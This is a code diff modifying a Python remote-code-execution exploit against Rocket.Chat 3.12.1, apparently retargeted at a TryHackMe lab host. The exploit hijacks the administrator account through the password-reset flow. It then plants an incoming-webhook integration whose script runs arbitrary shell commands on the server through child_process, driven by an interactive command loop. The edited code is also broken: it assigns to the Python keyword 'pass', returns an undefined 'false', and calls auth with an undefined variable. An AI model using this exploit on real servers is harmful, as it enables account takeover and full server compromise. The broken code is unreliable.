@@ -67,13 +67,14 @@ import json
 import argparse
 
 parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
-parser.add_argument('-a', help='Administrator email', required=True)
-parser.add_argument('-t', help='URL (Eg: http://rocketchat.local)', required=True)
+parser.add_argument('-a', help='Administrator email', default='admin@rocket.thm')
+parser.add_argument('-t', help='URL (Eg: http://rocketchat.local)', default='http://chat.rocket.thm')
+parser.add_argument('-p', help='Password to set (default is P@$$w0rd!1234)', default=b'P@$$w0rd!1234')
 args = parser.parse_args()
-
 
 adminmail = args.a
 target = args.t
+pass = args.p
 
 def forgotpassword(email,url):
 	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
@@ -109,21 +110,22 @@ def changingpassword(url,token):
 	if "error" in r.text:
 		exit("[-] Wrong token")
 	print("[+] Admin Password was changed !")
-
-def rce(url,cmd):
+	
+def auth(url):
 	# Authenticating
-	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
+	sha256pass = hashlib.sha256(pass).hexdigest()
 	headers={'content-type': 'application/json'}
 	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
 	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
 	if "error" in r.text:
-		exit("[-] Couldn't authenticate")
+		return false
 	data = json.loads(r.text)
 	data =(data['message'])
 	userid = data[32:49]
 	token = data[60:103]
-	print("[+] Succesfully authenticated as administrator")
+	return userid,token
 
+def rce(url,userid,token,cmd):
 	# Creating Integration
 	payload = '{"enabled":true,"channel":"#general","username":"admin","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true,"script":"class Script { process_incoming_request() { const require = console.log.constructor(\'return process.mainModule.require\')(); const { execSync } = require(\'child_process\'); res = execSync(\''+cmd+'\'); return { error: { sucess: true, message: res.toString() } } } }","type":"webhook-incoming"}'
 	cookies = {'rc_uid': userid,'rc_token': token}
@@ -144,22 +146,30 @@ def rce(url,cmd):
 
 ############################################################
 
-## Sending Reset mail
-print(f"[+] Resetting {adminmail} password")
-forgotpassword(adminmail,target)
+authRes = auth(url)
+if authRes == false:
+	## Sending Reset mail
+	print(f"[+] Resetting {adminmail} password")
+	forgotpassword(adminmail,target)
 
-## Getting reset token
-token = resettoken(target)
+	## Getting reset token
+	token = resettoken(target)
 
-## Resetting Password
-changingpassword(target,token)
+	## Resetting Password
+	changingpassword(target,token)
+	
+	print("[+] authenticating as admin")
+	authRes = auth(url)
+	if authRes == false:
+		print("[-] failed to auth")
+		return
 
 ## Authenticating and triggering rce
 
 while True:
 	cmd = input("CMD:> ")
 	try:
-		rce(target,cmd)
+		rce(target,authRes[0],authRes[1],cmd)
 	except:
 		print("command failed")
 ```
